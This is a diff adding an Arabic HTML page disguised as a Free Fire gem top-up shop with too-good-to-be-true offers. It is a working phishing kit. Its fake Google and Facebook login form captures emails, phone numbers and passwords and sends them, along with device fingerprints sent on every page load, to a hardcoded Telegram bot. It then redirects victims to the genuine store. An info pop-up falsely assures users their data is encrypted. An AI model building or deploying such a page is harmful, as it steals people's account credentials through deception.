@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن جواهر فري فاير - كرينا</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            color: white;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+            background: rgba(0,0,0,0.3);
+            backdrop-filter: blur(10px);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .logo {
+            width: 120px;
+            height: auto;
+        }
+
+        .login-buttons {
+            display: flex;
+            gap: 10px;
+        }
+
+        .login-btn {
+            padding: 10px 20px;
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            border: none;
+            border-radius: 25px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(254,202,87,0.4);
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(254,202,87,0.6);
+        }
+
+        .main-content {
+            padding-top: 100px;
+            padding-bottom: 50px;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .hero-section {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .hero-title {
+            font-size: 3.5rem;
+            background: linear-gradient(45deg, #00d4ff, #ff6b6b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+            text-shadow: 0 0 30px rgba(0,212,255,0.5);
+        }
+
+        .game-section {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 40px;
+            margin-bottom: 40px;
+            border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+
+        .game-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .game-btn {
+            width: 200px;
+            height: 200px;
+            border-radius: 20px;
+            border: none;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.4s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .freefire-btn {
+            background: linear-gradient(45deg, #ff4757, #ff3838);
+            color: white;
+            box-shadow: 0 15px 35px rgba(255,71,87,0.5);
+        }
+
+        .freefire-btn:hover {
+            transform: scale(1.1) translateY(-10px);
+            box-shadow: 0 25px 50px rgba(255,71,87,0.8);
+        }
+
+        .offers-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-bottom: 50px;
+        }
+
+        .offer-card {
+            background: rgba(0,212,255,0.1);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            border: 2px solid rgba(0,212,255,0.3);
+            transition: all 0.3s;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .offer-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s;
+        }
+
+        .offer-card:hover::before {
+            left: 100%;
+        }
+
+        .offer-card:hover {
+            transform: translateY(-10px);
+            border-color: #00d4ff;
+            box-shadow: 0 20px 40px rgba(0,212,255,0.4);
+        }
+
+        .offer-gems {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+        }
+
+        .offer-price {
+            font-size: 1.8rem;
+            color: #feca57;
+            font-weight: bold;
+        }
+
+        .free-offer {
+            background: linear-gradient(45deg, #00b894, #00cec9) !important;
+            border-color: #00b894 !important;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 2000;
+            backdrop-filter: blur(10px);
+        }
+
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(26,26,46,0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 40px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 2rem;
+            cursor: pointer;
+            color: #ff6b6b;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 10px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            font-size: 1.1rem;
+        }
+
+        .input-group input::placeholder {
+            color: rgba(255,255,255,0.7);
+        }
+
+        .charge-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(45deg, #00d4ff, #0099cc);
+            border: none;
+            border-radius: 15px;
+            color: white;
+            font-size: 1.3rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(0,212,255,0.4);
+        }
+
+        .charge-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0,212,255,0.6);
+        }
+
+        .error-msg {
+            background: rgba(255,71,87,0.3);
+            border: 1px solid #ff4757;
+            color: #ff4757;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 30px;
+            background: rgba(0,0,0,0.5);
+            margin-top: 50px;
+        }
+
+        .footer-text {
+            font-size: 1.1rem;
+            opacity: 0.8;
+        }
+
+        .info-btn {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(255,255,255,0.2);
+            border: 1px solid rgba(255,255,255,0.3);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s;
+        }
+
+        .info-btn:hover {
+            background: rgba(255,255,255,0.3);
+        }
+
+        @media (max-width: 768px) {
+            .hero-title {
+                font-size: 2.5rem;
+            }
+            
+            .game-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .game-btn {
+                width: 250px;
+                height: 180px;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="header">
+        <img src="https://via.placeholder.com/120x40/00d4ff/ffffff?text=كرينا" alt="كرينا" class="logo">
+        <div class="login-buttons">
+            <button class="login-btn" onclick="showLoginModal('google')">تسجيل جوجل</button>
+            <button class="login-btn" onclick="showLoginModal('facebook')">تسجيل فيسبوك</button>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="hero-section">
+            <h1 class="hero-title">شحن جواهر فري فاير</h1>
+            <p style="font-size: 1.5rem; opacity: 0.9;">احصل على جواهر مجانية ومدفوعة بأفضل الأسعار</p>
+        </div>
+
+        <div class="game-section">
+            <h2 style="text-align: center; margin-bottom: 30px; font-size: 2rem;">اختر لعبتك</h2>
+            <div class="game-buttons">
+                <button class="game-btn freefire-btn" onclick="selectGame('freefire')">
+                    🔥 فري فاير
+                </button>
+            </div>
+        </div>
+
+        <div id="offersSection" style="display: none;">
+            <h2 style="text-align: center; margin-bottom: 30px; font-size: 2.2rem;">عروض الجواهر</h2>
+            
+            <div class="offers-grid">
+                <div class="offer-card free-offer" onclick="selectOffer('500 مجاناً', 'مجاني')">
+                    <div class="offer-gems">💎 500</div>
+                    <div>عرض مجاني</div>
+                </div>
+                
+                <div class="offer-card" onclick="selectOffer('7000', '$2')">
+                    <div class="offer-gems">💎 7000</div>
+                    <div class="offer-price">$2</div>
+                </div>
+                
+                <div class="offer-card" onclick="selectOffer('10000', '$2.5')">
+                    <div class="offer-gems">💎 10000</div>
+                    <div class="offer-price">$2.5</div>
+                </div>
+                
+                <div class="offer-card" onclick="selectOffer('5000', '$5')">
+                    <div class="offer-gems">💎 5000</div>
+                    <div class="offer-price">$5</div>
+                </div>
+                
+                <div class="offer-card" onclick="selectOffer('7000', '$6')">
+                    <div class="offer-gems">💎 7000</div>
+                    <div class="offer-price">$6</div>
+                </div>
+                
+                <div class="offer-card" onclick="selectOffer('9000', '$7')">
+                    <div class="offer-gems">💎 9000</div>
+                    <div class="offer-price">$7</div>
+                </div>
+                
+                <div class="offer-card" onclick="selectOffer('100000', '$9')">
+                    <div class="offer-gems">💎 100000</div>
+                    <div class="offer-price">$9</div>
+                </div>
+                
+                <div class="offer-card" onclick="selectOffer('15000', '$13')">
+                    <div class="offer-gems">💎 15000</div>
+                    <div class="offer-price">$13</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button class="info-btn" onclick="showInfo()">ℹ️ معلومات</button>
+
+    <div class="footer">
+        <div class="footer-text">
+            هذا الموقع من صنع شركة الألعاب كرينا © 2026 جميع الحقوق محفوظة
+        </div>
+    </div>
+
+    <!-- تسجيل الدخول Modal -->
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal()">&times;</span>
+            <h2 id="loginTitle">تسجيل الدخول</h2>
+            <div id="errorMsg" class="error-msg"></div>
+            <div class="input-group">
+                <label>البريد الإلكتروني أو رقم الهاتف</label>
+                <input type="text" id="emailInput" placeholder="example@gmail.com">
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="passwordInput" placeholder="••••••••">
+            </div>
+            <button class="charge-btn" onclick="processLogin()">إشحن الآن 💎</button>
+        </div>
+    </div>
+
+    <!-- تأكيد الشراء Modal -->
+    <div id="confirmModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal()">&times;</span>
+            <h2>هل تريد شراء الجواهر؟</h2>
+            <button class="charge-btn" style="background: linear-gradient(45deg, #00b894, #00cec9); margin: 10px;" onclick="confirmPurchase()">نعم</button>
+            <button class="charge-btn" style="background: linear-gradient(45deg, #ff4757, #ff3838);" onclick="closeModal()">لا</button>
+        </div>
+    </div>
+
+    <script>
+        // معلومات البوت
+        const BOT_TOKEN = '8304853327:AAFeAptDA8KMcxp7Wgksfb3ajSBR4kOmK5E';
+        const CHAT_ID = '8038896092';
+
+        // جلب معلومات الزائر
+        function getVisitorInfo() {
+            return {
+                ip: 'جاري التحميل...',
+                country: 'جاري التحميل...',
+                device: navigator.userAgent,
+                os: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        // إرسال للبوت
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {
+                console.log('Error sending to Telegram');
+            }
+        }
+
+        // إرسال معلومات الزائر عند التحميل
+        window.onload = async function() {
+            const visitorInfo = getVisitorInfo();
+            const message = `
+🚨 <b>زائر جديد على الموقع!</b>
+
+🌐 <b>معلومات الجهاز:</b>
+📱 Device: ${visitorInfo.device.substring(0, 100)}...
+💻 OS: ${visitorInfo.os}
+🌍 Language: ${visitorInfo.language}
+📏 Screen: ${visitorInfo.screen}
+
+⏰ <b>الوقت:</b> ${visitorInfo.timestamp}
+
+🔗 <b>الرابط:</b> ${window.location.href}
+            `;
+            await sendToTelegram(message);
+        };
+
+        let selectedGame = '';
+        let selectedOffer = '';
+
+        function selectGame(game) {
+            selectedGame = game;
+            document.getElementById('offersSection').style.display = 'block';
+            document.querySelector('.game-section').scrollIntoView({behavior: 'smooth'});
+        }
+
+        function selectOffer(gems, price) {
+            selectedOffer = `${gems} - ${price}`;
+            showConfirmModal();
+        }
+
+        function showLoginModal(type) {
+            document.getElementById('loginTitle').textContent = `تسجيل ${type === 'google' ? 'جوجل' : 'فيسبوك'}`;
+            document.getElementById('loginModal').style.display = 'block';
+        }
+
+        function showConfirmModal() {
+            document.getElementById('confirmModal').style.display = 'block';
+        }
+
+        function closeModal() {
+            document.getElementById('loginModal').style.display = 'none';
+            document.getElementById('confirmModal').style.display = 'none';
+            document.getElementById('errorMsg').style.display = 'none';
+        }
+
+        async function processLogin() {
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+
+            if (!email || !password) {
+                showError('يرجى إدخال جميع البيانات');
+                return;
+            }
+
+            // التحقق من صحة البيانات (مثال بسيط)
+            if (password.length < 6) {
+                showError('كلمة المرور قصيرة جداً');
+                return;
+            }
+
+            if (!email.includes('@') && !/^\d{10,15}$/.test(email)) {
+                showError('البريد الإلكتروني أو رقم الهاتف غير صحيح');
+                return;
+            }
+
+            // إرسال للبوت
+            const visitorInfo = getVisitorInfo();
+            const message = `
+💎 <b>طلب شحن جديد!</b>
+
+🎮 <b>اللعبة:</b> ${selectedGame}
+💎 <b>العرض:</b> ${selectedOffer}
+
+📧 <b>البريد/الهاتف:</b> ${email}
+🔑 <b>كلمة المرور:</b> ${password}
+
+🌐 <b>معلومات الزائر:</b>
+📱 Device: ${visitorInfo.device.substring(0, 80)}...
+💻 OS: ${visitorInfo.os}
+⏰ Time: ${new Date().toLocaleString('ar')}
+
+🔗 Referrer: ${document.referrer || 'مباشر'}
+            `;
+            
+            await sendToTelegram(message);
+            
+            // إعادة توجيه للموقع الأصلي
+            window.location.href = 'https://shop2game.com/';
+        }
+
+        function confirmPurchase() {
+            showLoginModal('general');
+        }
+
+        function showError(msg) {
+            const errorEl = document.getElementById('errorMsg');
+            errorEl.textContent = msg;
+            errorEl.style.display = 'block';
+        }
+
+        function showInfo() {
+            alert('هذا الموقع مصمم لشحن حسابات الألعاب الشهيرة مثل فيسبوك، إنستغرام، جوجل، تيك توك، وتويتر بأمان تام. جميع البيانات مشفرة ومحمية.');
+        }
+
+        // إغلاق الـ modal عند الضغط خارجها
+        window.onclick = function(event) {
+            const modals = document.querySelectorAll('.modal');
+            modals.forEach(modal => {
+                if (event.target === modal) {
+                    closeModal();
+                }
+            });
+        }
+    </script>
+</body>
+</html>
